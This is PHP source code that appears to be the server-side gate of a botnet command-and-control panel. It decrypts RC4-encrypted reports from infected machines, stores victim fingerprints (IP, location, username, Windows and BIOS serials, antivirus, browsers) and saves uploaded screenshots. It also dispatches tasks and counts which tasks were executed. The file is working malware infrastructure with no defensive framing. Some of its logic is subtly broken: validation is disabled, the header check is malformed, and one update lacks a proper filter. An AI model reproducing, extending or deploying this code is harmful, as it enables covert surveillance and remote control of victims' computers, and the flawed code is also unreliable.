<?php
    include_once("gdx/gdx.php");
    include_once("gdx/internal.php");
    include_once("gdx/utility.php");
    
    function IsValidPOST($POST)
    {
        if (!(
            isset($POST["cid"]) &&
            isset($POST["cvr"]) &&
            isset($POST["har"]) &&
            isset($POST["fip"]) &&
            isset($POST["wiv"]) &&
            isset($POST["osa"]) &&
            isset($POST["wsp"]) &&
            isset($POST["wed"]) &&
            isset($POST["wbi"]) &&
            isset($POST["wlg"]) &&
            isset($POST["wsr"]) &&
            isset($POST["wdr"]) &&
            isset($POST["pcn"]) &&
            isset($POST["usn"]) &&
            isset($POST["ltm"]) &&
            isset($POST["cmd"]) &&
            isset($POST["ctp"]) &&
            isset($POST["bio"]) &&
            isset($POST["bmn"]) &&
            isset($POST["bvs"]) &&
            isset($POST["bsn"]) &&
            isset($POST["cpu"]) &&
            isset($POST["cmn"]) &&
            isset($POST["car"]) &&
            isset($POST["npr"]) &&
            isset($POST["vda"]) &&
            isset($POST["vrs"]) &&
            isset($POST["vrr"]) &&
            isset($POST["hds"]) &&
            isset($POST["pms"]) &&
            isset($POST["dbw"]) &&
            isset($POST["alb"]) &&
            isset($POST["anf"]) &&
            isset($POST["jvm"]) &&
            isset($POST["avs"])
            ))
        {
            return false;
        }
        
        if( (strlen($POST["cid"]) == 32 && ctype_xdigit($POST["cid"])) && 
            is_numeric($POST["cvr"]) &&
            $POST["har"] == 1 || $POST["har"] == 0 &&
            is_numeric($POST["wiv"]) &&
            $POST["osa"] == 1 || $POST["osa"] == 0 &&
            is_numeric($POST["wsp"]) &&
            is_numeric($POST["wed"]) &&
            is_numeric($POST["wbi"]) &&
            is_numeric($POST["wlg"]) &&
            ctype_print($POST["wsr"]) &&
            ctype_print($POST["wdr"]) &&
            !preg_match("/\W/", $POST["pcn"]) &&
            !preg_match("/\W/", $POST["usn"]) &&
            is_numeric($POST["ltm"]) &&
            ctype_print($POST["cmd"]) &&
            is_numeric($POST["ctp"]) &&
            ctype_print($POST["bio"]) &&
            ctype_print($POST["bmn"]) &&
            ctype_print($POST["bvs"]) &&
            ctype_print($POST["bsn"]) &&
            ctype_print($POST["cpu"]) &&
            ctype_print($POST["cmn"]) &&
            is_numeric($POST["car"]) &&
            is_numeric($POST["npr"]) &&
            ctype_print($POST["vda"]) &&
            ctype_print($POST["vrs"]) &&
            ctype_print($POST["vrr"]) &&
            ctype_print($POST["hds"]) &&
            ctype_print($POST["pms"]) &&
            ctype_print($POST["dbw"]) &&
            ctype_print($POST["alb"]) &&
            ctype_print($POST["anf"]) &&
            ctype_print($POST["jvm"]) &&
            ctype_print($POST["avs"]) 
            )
        {
            return true;
        }

        return false;
    }
    
    if($_SERVER["REQUEST_METHOD"] !== "POST" || !isset($_SERVER["CONTENT_LENGTH"])) die();
    
    try
    {
    
    $Host = MYSQL_HOST;
    $Database = DATABASE_NAME;
    $conn = new PDO("mysql:host=$Host;dbname=$Database", MYSQL_USER, MYSQL_PASSWORD);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $QrSett = $conn->query("SELECT * FROM Settings");
    $Sett = $QrSett->fetch(PDO::FETCH_ASSOC);
    
    //$keyhex = "E686C7C267C311A1066E3F97FBE52225";
    //$Sett["Key2"] = pack("H*", $keyhex);
    
    $_POST = array();
    $ContentLength = $_SERVER["CONTENT_LENGTH"];
    $Data = RC4($Sett["Key2"], KEY_SIZE, file_get_contents("php://input"), $ContentLength);
    parse_str($Data, $_POST);
    
    if (!isset($_POST["hdr"]) || (isset($_POST["hdr"]) != HEADER_CLIENT_NOTIFY 
        && isset($_POST["hdr"]) != HEADER_TASK_RESULT))
    {
        die();
    }
    
    $Result = "";
    $gdx = new GDX($conn);
    $gdx->UpdateTasksExp();
    
    if($_POST["hdr"] == HEADER_CLIENT_NOTIFY)
    {
        //if(IsValidPOST($_POST))
        {
            $ClientId = $_POST["cid"];
            $ClientIdBin = pack('H*', $ClientId);
            $SzIPAddress = GetIPAddress();
            $IPAddress = inet_pton($SzIPAddress);
            $Location = GetIPLocation($SzIPAddress);
            
            $SlPr = $conn->prepare("SELECT Id FROM Clients WHERE ClientId = ?");
            $SlPr->execute(array($ClientIdBin));
            $ClientIdAssoc = $SlPr->fetch(PDO::FETCH_ASSOC);
            
            if(!$ClientIdAssoc)
            {
                $sql = "INSERT INTO Clients (
                        ClientId , Version , IPAddress , Location , HasAdminRigths , FilePath , 
                        InstallDate , LastCheck , OperatingSystem , OSArchitecture , ServipackVersion , 
                        WindowsEdition , WindowsBuildId , WindowsLang , WindowsSerial , WindowsDir , 
                        PCName , UserName , PCLocalTime , ComputerModel , ComputerType , 
                        BIOSName , BIOSManufacturer , BIOSVersion , BIOSSerialNumber , 
                        CPUName , CPUManufacturer , CPUArquitecture, CPUNumberProcessors , 
                        VideoAdapter , VideoResolution , VideoRefreshRate , 
                        HardDrives , PhysicalMemories , DefaultBrowser , InstalledBrowsers , 
                        InstalledNETFrameworks , JAVAVM , Antivirus ) 
                        VALUES (:ClientId , :Version , :IPAddress , :Location , :HasAdminRigths , :FilePath , 
                        :InstallDate , :LastCheck , :OperatingSystem , :OSArchitecture , :ServipackVersion , 
                        :WindowsEdition , :WindowsBuildId , :WindowsLang , :WindowsSerial , :WindowsDir , 
                        :PCName , :UserName , :PCLocalTime , :ComputerModel , :ComputerType , 
                        :BIOSName , :BIOSManufacturer , :BIOSVersion , :BIOSSerialNumber , 
                        :CPUName , :CPUManufacturer , :CPUArquitecture , :CPUNumberProcessors , 
                        :VideoAdapter , :VideoResolution , :VideoRefreshRate , 
                        :HardDrives , :PhysicalMemories , :DefaultBrowser , :InstalledBrowsers , 
                        :InstalledNETFrameworks , :JAVAVM , :Antivirus )";
                        
                $InPr = $conn->prepare($sql);
                
                $InPr->execute(array(":ClientId" => $ClientIdBin, ":Version" => $_POST["cvr"],
                    ":IPAddress" => $IPAddress, ":Location" => $Location,
                    ":HasAdminRigths" => $_POST["har"], ":FilePath" => $_POST["fip"],
                    ":InstallDate" => $GdxCurrentTime, ":LastCheck" => $GdxCurrentTime,
                    ":OperatingSystem" => $_POST["wiv"], ":OSArchitecture" => $_POST["osa"],
                    ":ServipackVersion" => $_POST["wsp"], ":WindowsEdition" => $_POST["wed"],
                    ":WindowsBuildId" => $_POST["wbi"], ":WindowsLang" => $_POST["wlg"],
                    ":WindowsSerial" => $_POST["wsr"], ":WindowsDir" => $_POST["wdr"],
                    ":PCName" => $_POST["pcn"], ":UserName" => $_POST["usn"],
                    ":PCLocalTime" => $_POST["ltm"], ":ComputerModel" => $_POST["cmd"],
                    ":ComputerType" => $_POST["ctp"], ":BIOSName" => $_POST["bio"],
                    ":BIOSManufacturer" => $_POST["bmn"], ":BIOSVersion" => $_POST["bvs"],
                    ":BIOSSerialNumber" => $_POST["bsn"], ":CPUName" => $_POST["cpu"],
                    ":CPUManufacturer" => $_POST["cmn"], ":CPUArquitecture" => $_POST["car"],
                    ":CPUNumberProcessors" => $_POST["npr"], ":VideoAdapter" => $_POST["vda"],
                    ":VideoResolution" => $_POST["vrs"], ":VideoRefreshRate" => $_POST["vrr"],
                    ":HardDrives" => $_POST["hds"], ":PhysicalMemories" => $_POST["pms"],
                    ":DefaultBrowser" => $_POST["dbw"], ":InstalledBrowsers" => $_POST["alb"],
                    ":InstalledNETFrameworks" => $_POST["anf"], ":JAVAVM" => $_POST["jvm"],
                    ":Antivirus" => $_POST["avs"]
                    ));
            }
            else
            {
                $sql = "UPDATE Clients SET
                        ClientId = :ClientId, Version = :Version, IPAddress = :IPAddress, 
                        Location = :Location, HasAdminRigths = :HasAdminRigths, FilePath = :FilePath, 
                        LastCheck = :LastCheck, OperatingSystem = :OperatingSystem, 
                        OSArchitecture = :OSArchitecture, ServipackVersion = :ServipackVersion, 
                        WindowsEdition = :WindowsEdition, WindowsBuildId = :WindowsBuildId, 
                        WindowsLang = :WindowsLang, WindowsSerial = :WindowsSerial, WindowsDir = :WindowsDir, 
                        PCName = :PCName, UserName = :UserName, PCLocalTime = :PCLocalTime, 
                        ComputerModel = :ComputerModel, ComputerType = :ComputerType, 
                        BIOSName = :BIOSName, BIOSManufacturer = :BIOSManufacturer, BIOSVersion = :BIOSVersion, 
                        BIOSSerialNumber = :BIOSSerialNumber, CPUName = :CPUName, 
                        CPUManufacturer = :CPUManufacturer, CPUArquitecture = :CPUArquitecture, 
                        CPUNumberProcessors = :CPUNumberProcessors, 
                        VideoAdapter = :VideoAdapter, VideoResolution = :VideoResolution, 
                        VideoRefreshRate = :VideoRefreshRate, HardDrives = :HardDrives, 
                        PhysicalMemories = :PhysicalMemories, DefaultBrowser = :DefaultBrowser, 
                        InstalledBrowsers = :InstalledBrowsers, 
                        InstalledNETFrameworks = :InstalledNETFrameworks, JAVAVM = :JAVAVM, 
                        Antivirus = :Antivirus WHERE Id = :Id";
                
                $InPr = $conn->prepare($sql);
                
                $Id = $ClientIdAssoc["Id"];
                $InPr->execute(array(":ClientId" => $ClientIdBin, ":Version" => $_POST["cvr"],
                    ":IPAddress" => $IPAddress, ":Location" => $Location,
                    ":HasAdminRigths" => $_POST["har"], ":FilePath" => $_POST["fip"],
                    ":LastCheck" => $GdxCurrentTime, ":OperatingSystem" => $_POST["wiv"], 
                    ":OSArchitecture" => $_POST["osa"], ":ServipackVersion" => $_POST["wsp"], 
                    ":WindowsEdition" => $_POST["wed"], ":WindowsBuildId" => $_POST["wbi"], 
                    ":WindowsLang" => $_POST["wlg"], ":WindowsSerial" => $_POST["wsr"], 
                    ":WindowsDir" => $_POST["wdr"], ":PCName" => $_POST["pcn"], ":UserName" => $_POST["usn"],
                    ":PCLocalTime" => $_POST["ltm"], ":ComputerModel" => $_POST["cmd"],
                    ":ComputerType" => $_POST["ctp"], ":BIOSName" => $_POST["bio"],
                    ":BIOSManufacturer" => $_POST["bmn"], ":BIOSVersion" => $_POST["bvs"],
                    ":BIOSSerialNumber" => $_POST["bsn"], ":CPUName" => $_POST["cpu"],
                    ":CPUManufacturer" => $_POST["cmn"], ":CPUArquitecture" => $_POST["car"],
                    ":CPUNumberProcessors" => $_POST["npr"], ":VideoAdapter" => $_POST["vda"],
                    ":VideoResolution" => $_POST["vrs"], ":VideoRefreshRate" => $_POST["vrr"],
                    ":HardDrives" => $_POST["hds"], ":PhysicalMemories" => $_POST["pms"],
                    ":DefaultBrowser" => $_POST["dbw"], ":InstalledBrowsers" => $_POST["alb"],
                    ":InstalledNETFrameworks" => $_POST["anf"], ":JAVAVM" => $_POST["jvm"],
                    ":Antivirus" => $_POST["avs"], ":Id" => $Id
                    ));
            }
            
            if(isset($_POST["src"])) {
                $ImgBytes = pack('H*', $_POST["src"]);
                if(chmod("screenshots", 0777))
                {
                    $Image = fopen("screenshots/" . $ClientId . ".jpeg", "w");
                    if($Image) {
                        fwrite($Image, $ImgBytes);
                        fclose($Image);
                    }
                    chmod("screenshots", 0755);
                }
            }
            
            $Result = $gdx->LookupTask($conn, $ClientId);
        }
    }
    else if($_POST["hdr"] == HEADER_TASK_RESULT)
    {
        if (isset($_POST["tid"]) &&
            isset($_POST["cid"]) &&
            isset($_POST["trs"]) &&
            strlen($_POST["tid"]) == 32 && ctype_xdigit($_POST["tid"]) &&
            strlen($_POST["cid"]) == 32 && ctype_xdigit($_POST["cid"]) &&
            (is_numeric($_POST["trs"]) && ($_POST["trs"] == "1" || $_POST["trs"] == "0"))
            )
        {
            $TaskIdBin = pack('H*', $_POST["tid"]);
            $ClientIdBin = pack('H*', $_POST["cid"]);
            $Status = $_POST["trs"];
            
            $sql = "SELECT Status FROM TasksCompleted WHERE TaskId = :TaskId AND ClientId = :ClientId";
            $SlPr = $conn->prepare($sql);
            $SlPr->execute(array("TaskId" => $TaskIdBin, "ClientId" => $ClientIdBin));
            $TaskStatus = $SlPr->fetch(PDO::FETCH_ASSOC);
            
            if($TaskStatus["Status"] == TASK_CMPLD_SENT)
            {
                $Status = ($Status) ? TASK_CMPLD_EXECUTED : TASK_CMPLD_FAILED;
                
                $sql = "UPDATE TasksCompleted SET Status = :Status WHERE TaskId = :TaskId AND ClientId = :ClientId";
                $SlPr = $conn->prepare($sql);
                $SlPr->execute(array("Status" => $Status, "TaskId" => $TaskIdBin, "ClientId" => $ClientIdBin));
                
                if($Status == TASK_CMPLD_EXECUTED) {
                    $sql = "UPDATE Tasks SET ClientsExecuted = ClientsExecuted + 1 WHERE TaskId = :TaskId";
                    $SlPr = $conn->prepare($sql);
                    $SlPr->execute(array("TaskId" => $TaskIdBin));
                }
                else {
                    $sql = "UPDATE Tasks SET ClientsFailed = ClientsFailed + 1 WHERE TaskId = TaskId";
                    $SlPr = $conn->prepare($sql);
                    $SlPr->execute(array("TaskId" => $TaskIdBin));
                }
            }
        }
    }
    
    $conn = null;
    } catch(PDOException $e) {
        echo $e->getMessage();
    }
    
    echo $Result;
?>
